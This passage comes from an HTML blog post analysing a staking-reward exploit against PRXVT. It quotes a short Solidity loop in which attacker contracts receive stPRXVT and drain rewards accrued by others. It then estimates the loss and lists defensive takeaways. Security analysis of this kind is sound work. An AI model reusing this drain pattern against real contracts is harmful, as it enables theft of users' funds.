&lt;p&gt;And the loop that drives it:&lt;&#x2F;p&gt;
&lt;pre class=&quot;giallo&quot; style=&quot;color: #839496; background-color: #002B36;&quot;&gt;&lt;code data-lang=&quot;solidity&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; i; i &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color: #D33682;&quot;&gt; 20&lt;&#x2F;span&gt;&lt;span&gt;; i&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #859900;&quot;&gt;    bytes32&lt;&#x2F;span&gt;&lt;span&gt; salt &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(i));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    Attack a1 &lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;= new&lt;&#x2F;span&gt;&lt;span&gt; Attack{salt&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; salt}();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;    IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(a1),&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(attacker));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    a1.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Each &lt;code&gt;Attack&lt;&#x2F;code&gt; instance starts with zero reward history, receives stPRXVT, and immediately drains PRXVT rewards that were accrued by others.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;damage&quot;&gt;Damage&lt;&#x2F;h3&gt;
&lt;p&gt;The exploit contract still holds PRXVT tokens, but since the team pulled the LP, it’s hard to cash them out.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy4.png&quot; alt=&quot;Exploit contract balance and LP pulled&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The final loss is estimated at $97,852.95.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy5.png&quot; alt=&quot;Estimated final loss&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;takeaways&quot;&gt;Takeaways&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Reward accounting must distinguish between staked amounts (deposited via &lt;code&gt;stake&lt;&#x2F;code&gt;) and arbitrary transfers. Transferable staking tokens should not auto-accrue rewards without a staking event.&lt;&#x2F;li&gt;
&lt;li&gt;Using a non-transferable receipt token or blocking transfers to non-staking addresses would have prevented this vector.&lt;&#x2F;li&gt;
&lt;li&gt;Add invariant tests: “Receiving staking tokens via &lt;code&gt;transfer&lt;&#x2F;code&gt; must not increase &lt;code&gt;earned()&lt;&#x2F;code&gt; or allow &lt;code&gt;claimReward()&lt;&#x2F;code&gt; to succeed.”&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
